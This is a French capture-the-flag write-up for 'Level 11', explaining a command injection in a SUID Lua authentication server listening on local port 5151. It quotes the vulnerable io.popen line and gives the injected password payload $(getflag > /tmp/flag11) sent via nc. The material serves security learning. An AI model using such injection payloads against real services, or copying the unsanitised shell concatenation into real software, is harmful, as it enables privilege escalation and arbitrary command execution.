# Level 11

## 🎯 Objectif

Exploiter une vulnérabilité d'**Injection de Commande** (Command Injection) dans un serveur d'authentification écrit en Lua (un langage de programmation leger) afin d'exécuter du code arbitraire avec les privilèges de l'utilisateur `flag11`.

## 🐛 La Faille

À la racine se trouve un script `level11.lua` possédant le bit SUID et appartenant à `flag11`. Lorsqu'on tente de l'exécuter, on obtient une erreur `address already in use`. Cela indique que le script tourne déjà en tâche de fond (daemon).

Le code source révèle qu'il s'agit d'un serveur écoutant sur le port local `5151`. Sa fonction est de demander un mot de passe à l'utilisateur, d'en calculer le hash SHA1, et de le comparer à une valeur en dur.

La vulnérabilité critique se trouve dans la fonction de hachage :

```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
```

La fonction io.popen exécute une commande système. Le mot de passe entré par l'utilisateur (pass) est concaténé directement dans la commande bash sans aucune sanitisation (nettoyage). En utilisant des délimiteurs shell comme la substitution de commande $(), il est possible de s'échapper du echo et d'exécuter n'importe quel binaire du système.

## Résolution

L'attaque consiste à se connecter au port 5151 et à soumettre une charge utile (payload) qui exécutera getflag et redirigera son résultat dans un fichier accessible, puisque la sortie standard du programme Lua sera altérée par le sha1sum.

```bash
nc 127.0.0.1 5151
```

Password -> **$(getflag > /tmp/flag11)**

```bash
cat /tmp/flag11
```
